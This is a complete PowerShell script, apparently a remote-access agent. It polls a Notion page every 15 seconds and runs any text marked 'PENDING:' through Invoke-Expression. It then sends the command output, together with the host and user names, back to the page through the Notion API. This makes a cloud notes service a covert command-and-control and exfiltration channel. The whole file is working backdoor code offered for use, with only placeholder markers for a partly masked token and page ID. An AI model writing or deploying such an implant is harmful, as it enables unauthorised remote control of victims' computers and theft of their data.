# agent.ps1 — FINAL + OUTPUT CHUNKING (2000-char limit fixed)
$token = "ntn_xxxxxxxx369JDEl1slzXmrV6M6xxxxxxxxxxxxxxxxxxxx"   # ← YOUR TOKEN
$page  = "xxxxxxxxxxx9803c8061c9xxxxxxxxxx"                # ← YOUR PAGE ID
$hdr   = @{"Authorization"="Bearer $token";"Notion-Version"="2022-06-28";"Content-Type"="application/json"}

function Send-Result($text){
    $chunks = [Math]::Ceiling($text.Length / 1900)
    for($i=0;$i -lt $chunks;$i++){
        $start = $i*1900
        $chunk = $text.Substring($start,[Math]::Min(1900,$text.Length-$start))
        $body  = @{children=@(@{object="block";type="paragraph";paragraph=@{rich_text=@(@{type="text";text=@{content=$chunk}})}})} | ConvertTo-Json -Depth 10
        Invoke-RestMethod "https://api.notion.com/v1/blocks/$resultsId/children" -Method Patch -Headers $hdr -Body $body | Out-Null
    }
}

while($true){
  $all = (Invoke-RestMethod "https://api.notion.com/v1/blocks/$page/children" -Headers $hdr).results
  foreach($b in $all){
    if($b.type -ne "paragraph"){continue}
    $txt = ($b.paragraph.rich_text.plain_text -join '')
    if($txt -like "PENDING:*" -and $txt -notlike "*done*"){
      $cmd = $txt.Split(":",2)[1].Trim()
      $out = (Invoke-Expression $cmd 2>&1 | Out-String).Trim()
      $ts  = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
      $res = "[$ts] $env:COMPUTERNAME\$env:USERNAME`n$out"

      # Find RESULTS block once
      $global:resultsId = ($all | Where-Object { ($_.paragraph.rich_text.plain_text -join '') -like "*RESULT*" }).id
      if(-not $global:resultsId){ Write-Host "RESULTS block missing"; continue }

      Send-Result $res

      # Clear PENDING
      $clear = @{paragraph=@{rich_text=@(@{type="text";text=@{content="PENDING: done"}})}} | ConvertTo-Json -Depth 10
      Invoke-RestMethod "https://api.notion.com/v1/blocks/$($b.id)" -Method Patch -Headers $hdr -Body $clear | Out-Null

      Write-Host "[+] $cmd → sent (chunked if needed)"
    }
  }
  Start-Sleep 15
}